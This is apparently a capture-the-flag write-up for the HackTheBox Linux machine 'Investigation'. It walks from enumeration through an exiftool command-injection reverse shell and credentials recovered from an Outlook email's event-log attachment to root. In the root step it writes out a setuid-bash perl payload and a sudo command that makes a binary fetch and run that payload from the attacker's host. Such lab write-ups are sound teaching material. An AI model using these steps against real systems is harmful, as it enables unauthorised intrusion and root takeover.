# Investigation!
## @Author : M3tr1c_r00t
![Investigation](https://user-images.githubusercontent.com/99975622/221430198-7923c2ad-9139-445b-8226-31bb53e64096.png)
Investigation is a medium linux machine in which to gain foothold, we use a command injection vulnerability on a vulnerable outdated exiftool version, analysing a microsoft outlook file and find some logs and find creds to the user and some binary explaitation and reverse engineering to get root priviledges.
### Enumeration
#### Nmap
```
# Nmap 7.93 scan initiated Sat Jan 21 19:12:37 2023 as: nmap -sC -sV -A -p 22,80 -oN nmapports.txt 10.129.9.197
Nmap scan report for eforenzics.htb (10.129.9.197)
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2f1e6306aa6ebbcc0d19d4152674c6d9 (RSA)
|   256 274520add2faa73a8373d97c79abf30b (ECDSA)
|_  256 4245eb916e21020617b2748bc5834fe0 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: eForenzics - Premier Digital Forensics
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   245.36 ms 10.10.14.1
2   247.05 ms eforenzics.htb (10.129.9.197)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 21 19:12:59 2023 -- 1 IP address (1 host up) scanned in 22.59 seconds
```
#### Gobuster
```
/.htaccess           [33m (Status: 403)[0m [Size: 279]
/.hta                [33m (Status: 403)[0m [Size: 279]
/.htpasswd           [33m (Status: 403)[0m [Size: 279]
/assets              [36m (Status: 301)[0m [Size: 317][34m [--> http://eforenzics.htb/assets/][0m
/index.html          [32m (Status: 200)[0m [Size: 10957]
/server-status       [33m (Status: 403)[0m [Size: 279]
```

### Foothold as www-data
Since there is a web server running on port 80, we can take a look at it.
![Screenshot_2023-01-21_21_38_51](https://user-images.githubusercontent.com/99975622/221430354-d6e55c7a-048e-4a7e-b00b-2431d980534f.png)
If we click on the go service to be able to access the image forensics service, we get redirected to an upload pane.
![Screenshot_2023-01-21_21_38_56](https://user-images.githubusercontent.com/99975622/221430504-709dc1ab-c760-4ca5-9924-2d456a4815d5.png)
With that, we can try to upload an image(real) and see what the site does.
![Screenshot (90)](https://user-images.githubusercontent.com/99975622/221430916-a954784d-c4f2-4c03-a301-32039efa1bdf.png)
The site gives us a link and if we visit it, we get the exifdata of the image from the output of exiftool.
![Screenshot (91)](https://user-images.githubusercontent.com/99975622/221430966-a5295ef3-d672-4667-8784-c7ee20a38372.png)
If you look keenly on the vesion number, we can see it is ```12.37``` which seems to be a bit outdated from the one on the terminal.

With this information on hand, we can try and see if we can get a public exploit and boom!
```
https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429
```
![Screenshot (92)](https://user-images.githubusercontent.com/99975622/221431104-92008a3d-1b15-40c2-9332-5fdba5d05722.png)
Since we can see that there is a command injection vulnerability, we can exploit this to get a reverse shell onto our box.
So i made a sh reverse shell payload, put it in index.html then piped this to bash to get a shell.
(You could also have just done the payload directly onto burp...)
![Screenshot_2023-01-21_21_40_26](https://user-images.githubusercontent.com/99975622/221431232-db44338f-6a63-4904-8462-287e8dee11b5.png)

### WWW-data to user
After stabilizing the shell, I run linpeas and got an interesting file....
![image](https://user-images.githubusercontent.com/99975622/221433224-685a2cb5-bd3b-4a77-a650-9bb7c282b671.png)
I had never come along a ```.msg``` file extension, I asked chatgpt for some help and it turns out, this is an email.
![image](https://user-images.githubusercontent.com/99975622/221433643-cdbe8c77-3448-45f7-aa44-7141f72c46a2.png)
We can use an online .msg file viewer instead of using the microsoft outlook applicaton.
We find an attached zip file.
![Screenshot_2023-01-21_20_31_55](https://user-images.githubusercontent.com/99975622/221433856-99accc13-9a4e-4d0e-bc03-fe1679511950.png)

We can also use outlook to view this...
![image](https://user-images.githubusercontent.com/99975622/221433813-75aca4d8-aac1-40d0-9d21-22138e90b6bb.png)
done..
You can also just right click on the file and select open with outlook.
![Screenshot (3)](https://user-images.githubusercontent.com/99975622/221434969-8c462a04-7a88-4108-b89f-f5715996a529.png)
and there.
![Screenshot (4)](https://user-images.githubusercontent.com/99975622/221435000-3bfcda3c-5d86-4c1e-a5c8-5ff2ae6b0db7.png)
If we unzip the file, we find there is an.evtx file.
![Screenshot_2023-01-21_21_36_12](https://user-images.githubusercontent.com/99975622/221434661-913ed052-5f08-48cb-8089-7235c4f147b1.png)
The .evtx file extension is used for Microsoft Windows Event Log files. These files contain a record of system, application, and security events that have occurred on a computer running Windows. The Windows Event Log is a centralized, standardized way for Windows applications and services to record important system events, warnings, and errors.

The .evtx files can be viewed using the Windows Event Viewer, which is a built-in utility in Windows operating system. The Event Viewer allows you to view the contents of the .evtx files and analyze the events recorded within them. 

Well, since i was doing this box on a linux box, i searched for a converter and was able to convert this file to an xml file.
![Screenshot_2023-01-21_21_35_35](https://user-images.githubusercontent.com/99975622/221435237-4fad690c-e945-4952-8f66-bfe846419f61.png)
Since there was so much junk, i used the sort and uniq command to only see data which was not as much redundant.

And we find some creds to the smorton user.
![Screenshot_2023-01-21_21_34_20](https://user-images.githubusercontent.com/99975622/221435349-b465c61c-f5c1-4cc9-a93d-d57e1c6b0e5d.png)

You could have analysed the file using windows event viewer but the filtering was a bit odd.
![Screenshot (94)](https://user-images.githubusercontent.com/99975622/221435684-b6c48cba-4dff-4047-b0b2-8133a48d0828.png)
And we get the user flag.

### User to root
If we look at our sudo permissions, we can run a wierd binary as root.

![Screenshot (95)](https://user-images.githubusercontent.com/99975622/221435717-4ac1065f-2334-4bc0-9f80-79c236c1461a.png)
So with that, i transferred the binary to my machine for further analysis.
![Screenshot (18)](https://user-images.githubusercontent.com/99975622/221435954-b26c7411-f77a-4ae7-a950-b67a8ace8cb6.png)
#### Explanation of what the binary is doing.
The function begins by checking the value of the first parameter, param_1. If it is not equal to 3, the program prints "Exiting... " and exits with a status of 0 using the exit(0) function.

The next check is to ensure that the user running the program has a user ID of 0 (indicating that they are the root user). This is done using the getuid() function, which returns the user ID of the current user. If the user ID is not 0, the program again prints "Exiting... " and exits with a status of 0.

The program then uses the strcmp function to compare the string at memory address param_2 + 0x10 with the string "lDnxUysaQn". If the two strings are not equal, the program again prints "Exiting... " and exits with a status of 0.

If all of the previous checks pass, the program prints "Running... " to indicate that it is proceeding with the rest of the actions.

The program then opens a file with the same name as the string "lDnxUysaQn" in binary write mode using the fopen function, and assigns the file pointer to the variable __stream.

It then uses the curl library to download a file from the URL specified by the memory address param_2 + 8, and writes it to the previously opened file using the curl_easy_setopt and curl_easy_perform functions.

If the file was successfully downloaded, the program then constructs a string with the command "perl ./lDnxUysaQn" using the snprintf and malloc functions, and uses the system function to execute this command as the root user.

The program then uses the system function to delete the file "lDnxUysaQn" and the curl_easy_cleanup function to cleanup the resources allocated by the curl library.

If any of the previous steps fail, the program will print "Exiting... " and exit with a status of 0.
#### Exploiting the binary.
With that info, we can now bypass all the checks.
So to bypass this, we need to create a perl file which will make the /bin/bash binary suid executable.
We can put this file on our machines since we need to assign it a url.
With that, we can now exploit the binary.
```
echo "system("chmod u+s /bin/bash");" > root.pl
```
executing this binary
```
sudo /usr/bin/binary http://<ip>/root.pl lDnxUysaQn
```
![Screenshot (20)](https://user-images.githubusercontent.com/99975622/221436671-e1fe0f5f-bdc0-44bd-8038-0d2cf6dc2dce.png)
Let's check if it works.
![Screenshot (21)](https://user-images.githubusercontent.com/99975622/221436725-10d4a770-3d16-4ce6-96c1-9c78a46bd930.png)
We're root!
And done!

## My socials:
<br>@ twitter: https://twitter.com/M3tr1c_root
<br>@ instagram: https://instagram.com/m3tr1c_r00t/
